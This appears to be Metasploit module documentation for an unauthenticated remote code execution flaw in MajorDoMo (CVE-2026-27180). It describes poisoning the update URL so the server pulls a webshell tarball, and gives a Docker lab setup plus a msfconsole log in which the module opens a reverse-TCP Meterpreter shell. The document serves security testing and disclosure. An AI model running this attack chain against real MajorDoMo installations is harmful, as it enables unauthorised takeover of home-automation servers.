## Vulnerable Application

This module exploits an unauthenticated Remote Code Execution vulnerability in MajorDoMo's saverestore module via
supply chain poisoning. The saverestore module's `admin()` method is reachable without authentication through the
`/objects/?module=saverestore` endpoint because `usual()` calls `admin()` directly and the mode checks use `gr()`
(which reads from `$_REQUEST`) instead of `$this->mode`.

Two unauthenticated GET requests chain together for full RCE:

1. `auto_update_settings` - poisons the `MASTER_UPDATE_URL` config to point to an attacker-controlled server
2. `force_update` - triggers `autoUpdateSystem()` which fetches an Atom feed and tarball from the poisoned URL,
   extracts the tarball, and copies all files to the webroot via `copyTree()`

The tarball is downloaded via curl with `CURLOPT_SSL_VERIFYPEER` set to `FALSE` and no integrity check. The module
serves a fake Atom feed with an entry older than the configured delay (default 1 day) and a tarball containing a PHP
webshell. After deployment, the payload is executed through the webshell.

All versions of MajorDoMo are affected. The `alpha` branch was patched via
[PR #1177](https://github.com/sergejey/majordomo/pull/1177), but `master` has not been updated.
The checkout hash below (`41086aaa`) pins a known vulnerable commit on `alpha` to ensure a reproducible lab setup.

## Options

### UPDATE_TIMEOUT

Seconds to wait for MajorDoMo to fetch the Atom feed and tarball from the attacker HTTP server.
Default: `30`.

## Setup

### Docker Setup

Create a working directory and clone the vulnerable MajorDoMo source:

```bash
mkdir majordomo-lab && cd majordomo-lab
git clone https://github.com/sergejey/majordomo.git src
cd src && git checkout 41086aaa && cd ..
```

Create a `Dockerfile`:

```dockerfile
FROM php:7.4-apache

RUN docker-php-ext-install mysqli pdo pdo_mysql
RUN a2enmod rewrite

RUN apt-get update && apt-get install -y default-mysql-client curl && rm -rf /var/lib/apt/lists/*

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

WORKDIR /var/www/html

ENTRYPOINT ["/entrypoint.sh"]
CMD ["apache2-foreground"]
```

Create an `entrypoint.sh`:

```bash
#!/bin/bash
set -e

echo "[*] Waiting for MySQL..."
until mysql -h db -u root -pmajordomo -e "SELECT 1" &>/dev/null; do
    sleep 1
done

echo "[*] Setting up database..."
mysql -h db -u root -pmajordomo -e "CREATE DATABASE IF NOT EXISTS db_terminal CHARACTER SET utf8mb4;"
mysql -h db -u root -pmajordomo db_terminal < /var/www/html/db_terminal.sql 2>/dev/null || true

echo "[*] Configuring Majordomo..."
cp /var/www/html/config.php.sample /var/www/html/config.php
sed -i "s/Define('DB_HOST', 'localhost');/Define('DB_HOST', 'db');/" /var/www/html/config.php
sed -i "s/Define('DB_PASSWORD', '');/Define('DB_PASSWORD', 'majordomo');/" /var/www/html/config.php

mkdir -p /var/www/html/cached /var/www/html/cms /var/www/html/saverestore
chown -R www-data:www-data /var/www/html/

echo "[+] Majordomo ready on port 80"
exec "$@"
```

Create a `docker-compose.yml`:

```yaml
services:
  db:
    image: mariadb:10.6
    environment:
      MYSQL_ROOT_PASSWORD: majordomo
      MYSQL_DATABASE: db_terminal
    networks:
      - mdnet
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-pmajordomo"]
      interval: 3s
      timeout: 5s
      retries: 10

  web:
    build: .
    ports:
      - "8899:80"
    volumes:
      - ./src:/var/www/html
    networks:
      - mdnet
    depends_on:
      db:
        condition: service_healthy

networks:
  mdnet:
    driver: bridge
```

Start the lab:

```bash
chmod +x entrypoint.sh
docker compose up -d --build
```

MajorDoMo will be available at `http://127.0.0.1:8899`.

**Important**: The `LHOST` and `SRVHOST` must be set to the Docker network gateway so the container can
reach the handler and HTTP server. Find it with:

```bash
docker network inspect majordomo-lab_mdnet --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}'
```

## Verification Steps

1. Start the vulnerable MajorDoMo instance (see Docker setup above)
2. Launch msfconsole: `use exploit/multi/http/majordomo_supply_chain_rce`
3. Set `RHOSTS` to `127.0.0.1` and `RPORT` to `8899`
4. Set `SRVHOST` to a routable IP reachable from the Docker container (e.g. `172.17.0.1`)
5. Run `check` to verify MajorDoMo is accessible
6. Set payload and execute

## Scenarios

### Scenario 1: PHP Meterpreter on Docker Lab

```
msf6 > use exploit/multi/http/majordomo_supply_chain_rce
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set RPORT 8899
RPORT => 8899
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set LHOST 192.168.32.1
LHOST => 192.168.32.1
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set SRVHOST 192.168.32.1
SRVHOST => 192.168.32.1
msf6 exploit(multi/http/majordomo_supply_chain_rce) > set SRVPORT 9998
SRVPORT => 9998
msf6 exploit(multi/http/majordomo_supply_chain_rce) > run
[*] Started reverse TCP handler on 192.168.32.1:4444
[*] Using URL: http://192.168.32.1:9998/
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Console eval is accessible without authentication (saverestore module also reachable)
[*] Serving fake Atom feed...
[*] Serving malicious tarball (641 bytes)...
[*] Waiting up to 30s for MajorDoMo to fetch the update...
[*] Update fetched, waiting for deployment...
[*] Sending stage (42137 bytes) to 192.168.32.3
[+] Deleted hwaMuKak.php
[*] Meterpreter session 1 opened (192.168.32.1:4444 -> 192.168.32.3:42476) at 2026-02-27 14:26:16 +0100

meterpreter > getuid
Server username: www-data
```

## References

- CVE-2026-27180
- <https://chocapikk.com/posts/2026/majordomo-revisited/>
- <https://github.com/sergejey/majordomo/pull/1177>
